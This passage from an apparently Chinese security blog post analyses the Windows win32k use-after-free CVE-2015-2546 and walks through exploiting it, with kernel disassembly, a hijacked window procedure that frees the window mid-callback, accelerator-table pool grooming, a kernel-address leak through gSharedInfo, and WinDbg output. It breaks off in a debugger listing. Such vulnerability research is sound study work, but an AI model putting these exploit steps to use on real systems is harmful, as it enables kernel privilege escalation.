对象是否为当前的根弹出菜单对象</li><li>2.通过<code>xxxMNFindWindowFromPoint</code>获取到的窗口对象的有效性，即不能为-1，也不能为-5，且不能被销毁。</li><li>3.利用<code>xxxSendMessage</code>发送<code>MN_SELECTITEM</code>消息之后，返回的标志是<code>MF_POPUP</code>(弹出菜单)，以及不为<code>MFS_GRAYED</code>(禁用状态)</li><li>4.利用<code>xxxSendMessage</code>发送<code>MN_SETTIMERTOOPENHIERARCHY</code>消息返回值为0</li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"> * Select the item.</span></div><div class="line"><span class="comment"> */</span></div><div class="line">uFlags = (UINT)xxxSendMessage(pwnd, MN_SELECTITEM, (<span class="keyword">WPARAM</span>)cmdItem, <span class="number">0</span>L)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> ((uFlags &amp; MF_POPUP) &amp;&amp; !(uFlags &amp; MFS_GRAYED)) &#123;</div><div class="line">   <span class="comment">/*</span></div><div class="line"><span class="comment">    * User moved back onto an item with a hierarchy. Hide the</span></div><div class="line"><span class="comment">    * the dropped popup.</span></div><div class="line"><span class="comment">    */</span></div><div class="line">   <span class="keyword">if</span> (!xxxSendMessage(pwnd, MN_SETTIMERTOOPENHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L)) &#123;</div><div class="line">        xxxMNHideNextHierarchy(ppopup)<span class="comment">;</span></div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重点分析一下<code>xxxMNMouseMove</code>函数，CVE-2015-2546是一个UAF漏洞，漏洞本质如上所述，在执行<code>xxxSendMessage</code>执行流返回用户侧代码，销毁窗口对象pwnd，然后xxxMNHideNextHierarchy没有经过检查便使用了已经销毁的窗口对象pwnd。但是在此之前，调用<code>xxxMNFindWindowFromPoint</code>是要确保得到的对象有效性。所以，只能在发送<code>MN_SETTIMERTOOPENHIERARCHY</code>的时机去销毁。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="function">VOID <span class="title">xxxMNMouseMove</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">    PPOPUPMENU ppopup,</span></span></div><div class="line"><span class="function"><span class="params">    PMENUSTATE pMenuState,</span></span></div><div class="line"><span class="function"><span class="params">    POINTS ptScreen</span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    <span class="keyword">if</span> (!IsRootPopupMenu(ppopup)) &#123;</div><div class="line">        RIPMSG0(RIP_ERROR,</div><div class="line">            <span class="string">"MenuMouseMoveHandler() called for a non top most menu"</span>);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    cmdHitArea = xxxMNFindWindowFromPoint(ppopup, &amp;cmdItem, ptScreen);</div><div class="line">[<span class="meta">...</span>]</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmdHitArea != <span class="number">0</span>) &#123;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">pwnd = (PWND)(cmdHitArea);</div><div class="line">        ppopup = ((PMENUWND)pwnd)-&gt;ppopupmenu;</div><div class="line">[<span class="meta">...</span>]</div><div class="line">        uFlags = (UINT)xxxSendMessage(pwnd, MN_SELECTITEM, (WPARAM)cmdItem, <span class="number">0</span>L);</div><div class="line">        <span class="keyword">if</span> ((uFlags &amp; MF_POPUP) &amp;&amp; !(uFlags &amp; MFS_GRAYED)) </div><div class="line">&#123;</div><div class="line">           <span class="keyword">if</span> (!xxxSendMessage(pwnd, MN_SETTIMERTOOPENHIERARCHY, <span class="number">0</span>, <span class="number">0</span>L)) </div><div class="line">&#123;</div><div class="line">                xxxMNHideNextHierarchy(ppopup);</div><div class="line">           &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">[<span class="meta">...</span>]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，现在劫持的回调函数中，需要处理三种消息。编写的消息处理函数如下。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">[+] MN_FINDMENUWINDOWFROMPOINT:只需要返回一个有效的窗口对象即可。</div><div class="line">[+] MN_SELECTITEM:只需要返回<span class="number">0</span>x3或者<span class="number">0</span>x10的标志即可。</div><div class="line">[+] MN_SETTIMERTOOPENHIERARCHY:首先，需要返回<span class="number">0</span>，然后还要销毁上面那个有效的窗口对象，以保证漏洞能被利用</div><div class="line"><span class="comment">//////////</span></div><div class="line">LRESULT CALLBACK NewWndProc(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT uMsg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)<span class="comment">//back default tagWnd will change!!!</span></div><div class="line">&#123;</div><div class="line">LPACCELlpAccel<span class="comment">;</span></div><div class="line"><span class="comment">// 处理 1EB 的消息</span></div><div class="line"><span class="keyword">if</span> (uMsg == MN_FINDMENUWINDOWFROMPOINT)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> (LONG)hWnd2<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (uMsg == MN_SETTIMERTOOPENHIERARCHY)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (hWnd2 != NULL)</div><div class="line">&#123;</div><div class="line"><span class="comment">// #32768窗口进行销毁,tagPopupMenu被释放</span></div><div class="line">DestroyWindow(hWnd2)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 返回值为0绕过判断</span></div><div class="line"><span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// 处理 1E5 的消息,返回 0x10</span></div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (uMsg == MN_SELECTITEM)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>x10<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> CallWindowProcA(lpPrevWndFunc, <span class="keyword">hWnd</span>, uMsg, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当返回一个普通的窗口对象的时候，发现<code>IsWindowBeingDestroyed</code>过不去，这个问题，前辈已经解决，当创建一个”#32768”窗口对象即可。<br><figure class="highlight tcl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">text:<span class="number">95</span>ADEA1F     _IsWindowBeingDestroyed@<span class="number">4</span> <span class="keyword">proc</span><span class="title"> near</span>     ;<span class="title"> CODE</span> XREF:<span class="title"> ShouldComposeOrDecomposeWindow(x,x)+19↑p</span></div><div class="line"><span class="title">.text:95ADEA1F</span>                                             ;<span class="title"> _HungWindowFromGhostWindow(x)+17↑p</span> ...</div><div class="line">.text:95ADEA1F</div><div class="line">.text:95ADEA1F<span class="title">     arg_0</span>           =<span class="title"> dword</span> ptr  8</div><div class="line">.text:95ADEA1F</div><div class="line">.text:95ADEA1F 000<span class="title">                 mov</span> <span class="title">    edi,</span> edi</div><div class="line">.text:95ADEA21 000<span class="title">                 push</span> <span class="title">   ebp</span></div><div class="line"><span class="title">.text:95ADEA22</span> 004<span class="title">                 mov</span> <span class="title">    ebp,</span> esp</div><div class="line">.text:95ADEA24 004<span class="title">                 mov</span> <span class="title">    edx,</span> [ebp+8]</div><div class="line">.text:95ADEA27 004<span class="title">                 push</span> <span class="title">   esi</span></div><div class="line"><span class="title">.text:95ADEA28</span> 008<span class="title">                 push</span> <span class="title">   edx</span>             ;<span class="title"> a1</span></div><div class="line"><span class="title">.text:95ADEA29</span> 00C<span class="title">                 xor</span> <span class="title">    esi,</span> esi</div><div class="line">.text:95ADEA2B 00C<span class="title">                 call</span> <span class="title">   _IsWindowDestroyed@4</span> ;<span class="title"> IsWindowDestroyed(x)</span></div><div class="line"><span class="title">.text:95ADEA30</span> 008<span class="title">                 test</span> <span class="title">   eax,</span> eax</div><div class="line">.text:95ADEA32 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA34 008<span class="title">                 test</span> <span class="title">   byte</span> ptr [edx+18h], 80h ;<span class="title"> tagWND-&gt;bInDestroy</span></div><div class="line"><span class="title">.text:95ADEA38</span> 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA3A 008<span class="title">                 mov</span> <span class="title">    eax,</span> 8000h</div><div class="line">.text:95ADEA3F 008<span class="title">                 test</span>    [edx+2Ah],<span class="title"> ax</span></div><div class="line"><span class="title">.text:95ADEA43</span> 008<span class="title">                 jnz</span> <span class="title">    short</span> loc_95ADEA55</div><div class="line">.text:95ADEA45 008<span class="title">                 mov</span> <span class="title">    edx,</span> [edx+8]</div><div class="line">.text:95ADEA48 008<span class="title">                 test</span> <span class="title">   edx,</span> edx</div><div class="line">.text:95ADEA4A 008<span class="title">                 jz</span> <span class="title">     short</span> loc_95ADEA58</div><div class="line">.text:95ADEA4C 008<span class="title">                 test</span> <span class="title">   byte</span> ptr [edx+0D8h], 1</div><div class="line">.text:95ADEA53 008<span class="title">                 jz</span> <span class="title">     short</span> loc_95ADEA58</div><div class="line">.text:95ADEA55</div><div class="line">.text:95ADEA55<span class="title">     loc_95ADEA55:</span>                           ;<span class="title"> CODE</span> XREF:<span class="title"> IsWindowBeingDestroyed(x)+13↑j</span></div><div class="line"><span class="title">.text:95ADEA55</span>                                             ;<span class="title"> IsWindowBeingDestroyed(x)+19↑j</span> ...</div><div class="line">.text:95ADEA55 008<span class="title">                 xor</span> <span class="title">    esi,</span> esi</div><div class="line">.text:95ADEA57 008<span class="title">                 inc</span> <span class="title">    esi</span></div><div class="line"><span class="title">.text:95ADEA58</span></div><div class="line"><span class="title">.text:95ADEA58</span> <span class="title">    loc_95ADEA58:</span>                           ;<span class="title"> CODE</span> XREF:<span class="title"> IsWindowBeingDestroyed(x)+2B↑j</span></div><div class="line"><span class="title">.text:95ADEA58</span>                                             ;<span class="title"> IsWindowBeingDestroyed(x)+34↑j</span></div><div class="line"><span class="title">.text:95ADEA58</span> 008<span class="title">                 mov</span> <span class="title">    eax,</span> esi</div><div class="line">.text:95ADEA5A 008<span class="title">                 pop</span> <span class="title">    esi</span></div><div class="line"><span class="title">.text:95ADEA5B</span> 004<span class="title">                 pop</span> <span class="title">    ebp</span></div><div class="line"><span class="title">.text:95ADEA5C</span> 000<span class="title">                 retn</span>    4</div><div class="line">.text:95ADEA5C<span class="title">     _IsWindowBeingDestroyed@4</span> endp</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在调试器中，获取弹出菜单对象Popupmenu的地址为0xfe78d9a8，然后当执行完<code>xxxSendMessage(cmdHitArea_1, MN_SETTIMERTOOPENHIERARCHY, 0, 0)</code>销毁了窗口对象之后，很显然，该对象被释放，然后PopupMenu作为参数传入xxxMNHideNextHierarchy，会对popupmenu的spwndNextPopup成员进行判断，为空则直接退出，所以，只需要伪造PopupMenu对象，就可以实现对这块内存的控制。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">kd&gt; g</div><div class="line">Breakpoint 0 hit</div><div class="line">win32k!xxxMNMouseMove+0xe6:</div><div class="line">95ab821f 8b9eb0000000    mov     ebx,dword ptr [esi+0B0h]</div><div class="line">kd&gt; r esi</div><div class="line"><span class="attribute">esi</span>=fe8109a8</div><div class="line">kd&gt; dc fe8109a8+B0</div><div class="line">ReadVirtual: fe810a58 <span class="keyword">not</span> properly sign extended</div><div class="line">fe810a58  fe78d9a8 006e0057 00010017 08000018  <span class="built_in">..</span>x.W.n<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe810a68  0013019c 0000000b ff5e42c8 87daca18  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.B^<span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe810a78  fe810a68 60080018 80000700 00000100  h<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>`<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe810a88  04c00000 00000000 00000000 fe810b20  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span> <span class="built_in">..</span>.</div><div class="line">fe810a98  fe8069e8 fe800618 00000000 00000000  .i<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">d&gt; !pool fe78d9a8 </div><div class="line">Pool<span class="built_in"> page </span>fe78d9a8 region is Unknown</div><div class="line"> fe78d000 size:   d0 previous size:    0  (Allocated)  Gpff</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span>.]</div><div class="line"> fe78d628 size:  2e0 previous size:   d0  (Allocated)  Ttfd</div><div class="line"> fe78d908 size:   50 previous size:  2e0  (Allocated)  Ttfd</div><div class="line"> fe78d958 size:   48 previous size:   50  (Allocated)  Gffv</div><div class="line"><span class="number">*fe78d9a0</span> size:   40 previous size:   48  (Free ) *Uspm Process: 88877030</div><div class="line">Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup</div><div class="line"> fe78d9e0 size:   10 previous size:   40  (Allocated)  Glnk</div><div class="line"> fe78d9f0 size:   70 previous size:   10  (Allocated)  Ghab</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span>.]</div></pre></td></tr></table></figure></p><h2 id="0x02-漏洞利用及验证"><a href="#0x02-漏洞利用及验证" class="headerlink" title="0x02 漏洞利用及验证"></a>0x02 漏洞利用及验证</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下CVE-2015-2546的漏洞利用，通过伪造PopupMenu对象，去占用销毁窗口对象留下的内存空洞，从而实现漏洞利用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在，整个逻辑就很清楚了，首先通过加速键表，占用一大段内存空间,每次申请5个ACCEL的大小，一共申请50次，然后释放部分加速键表，造成内存空洞，然后创建的窗口对象便会占用其中一个内存空洞中。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">LPACCELlpAccel = (<span class="name">LPACCEL</span>)LocalAlloc(<span class="name">LPTR</span>, sizeof(<span class="name">ACCEL</span>) * 0x5);// 大小 0x8 * <span class="number">0</span>x5 = <span class="number">0</span>x28 与 tagPOPUPMENU 大小相同</div><div class="line">for (<span class="name">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 50; i++)</span></div><div class="line">&#123;</div><div class="line">hAccel[i] = CreateAcceleratorTable(<span class="name">lpAccel</span>, <span class="number">0</span>x5)<span class="comment">;</span></div><div class="line">index = LOWORD(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">Address = <span class="symbol">&amp;gHandleTable</span>[index]<span class="comment">;</span></div><div class="line">pAcceleratorTable[i] = (<span class="name">PUCHAR</span>)Address-&gt;pKernel<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Create Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">// 释放双数的加速键表,制造空洞</div><div class="line">for (<span class="name">int</span> i = <span class="number">2</span><span class="comment">; i &lt; 50; i = i + 5)</span></div><div class="line">&#123;</div><div class="line">DestroyAcceleratorTable(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Destroy Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将占用的内存地址打印出来，并在windbg中输出tagWnd2的PopupMenu对象地址为<code>fe440168</code>，很显然，新创建的窗口对象占用了之前释放的内存空洞。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">[+] Create Accelerator pKernelAddress at : 0xFFA27058</div><div class="line">[<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>]</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFE48C290</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF49CA70</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF52FBE8</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF589128</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF58B128</div><div class="line">[+] Create Accelerator pKernelAddress at : 0xFF55F120</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF4AC7F8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE486BC8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD36D288</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE440168  &lt;---</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFE6A94E8</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD392A70</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF5A10E0</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFD351170</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF51B960</div><div class="line">[+] Destroy Accelerator pKernelAddress at : 0xFF589128</div><div class="line">[+] hWnd2 Address: 0x00D62B58</div><div class="line">[+] tagWnd2 at pKernel<span class="built_in"> Address </span>: 0xFE812B58</div><div class="line">kd&gt; DC FE812B58+b0</div><div class="line">ReadVirtual: fe812c08 <span class="keyword">not</span> properly sign extended</div><div class="line">fe812c08  fe440168 00000013 0000000a 00000018  h.D<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe812c18  fe80ab70 fe80f1b0 00000000 00000000  p<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe812c28  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe812c38  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe812c48  002c024b 00000000 00000000 00000000  K.,<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;泄露加速表地址可以借助<code>SHAREDINFO</code>结构体的PUSER_HANDLE_ENTRY成员，这是ENTRY可以理解为一张句柄表。而每一个USER_HANDLE_ENTRY第一个成员pKernel则指向内存地址。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _SHAREDINFO &#123;</div><div class="line">PSERVERINFO psi<span class="comment">;</span></div><div class="line">PUSER_HANDLE_ENTRY aheList<span class="comment">;</span></div><div class="line">ULONG HeEntrySize<span class="comment">;</span></div><div class="line">ULONG_PTR pDispInfo<span class="comment">;</span></div><div class="line">ULONG_PTR ulSharedDelts<span class="comment">;</span></div><div class="line">ULONG_PTR awmControl<span class="comment">;</span></div><div class="line">ULONG_PTR DefWindowMsgs<span class="comment">;</span></div><div class="line">ULONG_PTR DefWindowSpecMsgs<span class="comment">;</span></div><div class="line">&#125; <span class="keyword">SHAREDINFO, </span>*PSHAREDINFO<span class="comment">;</span></div><div class="line">typedef struct _USER_HANDLE_ENTRY &#123;</div><div class="line">void* pKernel<span class="comment">;</span></div><div class="line">union</div><div class="line">&#123;</div><div class="line">PVOID pi<span class="comment">;</span></div><div class="line">PVOID pti<span class="comment">;</span></div><div class="line">PVOID ppi<span class="comment">;</span></div><div class="line">&#125;<span class="comment">;</span></div><div class="line"><span class="keyword">BYTE </span>type<span class="comment">;</span></div><div class="line"><span class="keyword">BYTE </span>flags<span class="comment">;</span></div><div class="line">WORD generation<span class="comment">;</span></div><div class="line">&#125; USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY<span class="comment">;</span></div></pre></td></tr></table></figure></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">PSHAREDINFO pSharedInfo = (<span class="name">PSHAREDINFO</span>)GetProcAddress(<span class="name">GetModuleHandleA</span>(<span class="string">"user32.dll"</span>), <span class="string">"gSharedInfo"</span>)<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] gSharedInfo at : 0x%p\n"</span>, pSharedInfo)<span class="comment">;</span></div><div class="line">PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo-&gt;aheList<span class="comment">;</span></div><div class="line">LPACCELlpAccel = (<span class="name">LPACCEL</span>)LocalAlloc(<span class="name">LPTR</span>, sizeof(<span class="name">ACCEL</span>) * 0x5);// 大小 0x8 * <span class="number">0</span>x5 = <span class="number">0</span>x28 与 tagPOPUPMENU 大小相同</div><div class="line">for (<span class="name">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 50; i++)</span></div><div class="line">&#123;</div><div class="line">hAccel[i] = CreateAcceleratorTable(<span class="name">lpAccel</span>, <span class="number">0</span>x5)<span class="comment">;</span></div><div class="line">index = LOWORD(<span class="name">hAccel</span>[i])<span class="comment">;</span></div><div class="line">Address = <span class="symbol">&amp;gHandleTable</span>[index]<span class="comment">;</span></div><div class="line">pAcceleratorTable[i] = (<span class="name">PUCHAR</span>)Address-&gt;pKernel<span class="comment">;</span></div><div class="line">printf(<span class="string">"[+] Create Accelerator pKernelAddress at : 0x%p\n"</span>, pAcceleratorTable[i])<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，原先的tagWnd对象已经被销毁，由新申请的加速键内存占用。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">kd&gt; dc ebx</div><div class="line">fe440168  001c0253 00000000 00000000 00000005  S<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe440178  00000000 00000000 00000000 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe440188  00000000 00000000 00000080 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe440198  00000000 86111030 46140008 38616c47  <span class="built_in">..</span><span class="built_in">..</span>0<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>FGla8</div><div class="line">fe4401a8  04080934 00000001 80000000 00000000  4<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</div><div class="line">fe4401b8  00008208 00000000 0000907f 00000000  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe4401c8  00000000 00000000 00000000 00000001  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></div><div class="line">fe4401d8  00000000 00000000 00000000 95a30d56  <span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>V<span class="built_in">..</span>.</div><div class="line">kd&gt; t</div><div class="line">win32k!xxxMNMouseMove+0x153:</div><div class="line">95ab828c e86e1effff      call    win32k!xxxMNHideNextHierarchy (95aaa0ff)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNHideNextHierarchy</code>中调用<code>win32k!xxxSendMessage</code>此时传入的对象是伪造的加速键表。剩下的就和CVE-2014-4113差不多的利用方式，区别就是4113的对象是0xFFFFFFFB。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kd&gt; </div><div class="line">win<span class="number">32</span>k<span class="title">!xxxMNHideNextHierarchy</span>+<span class="number">0x41</span>:</div><div class="line"><span 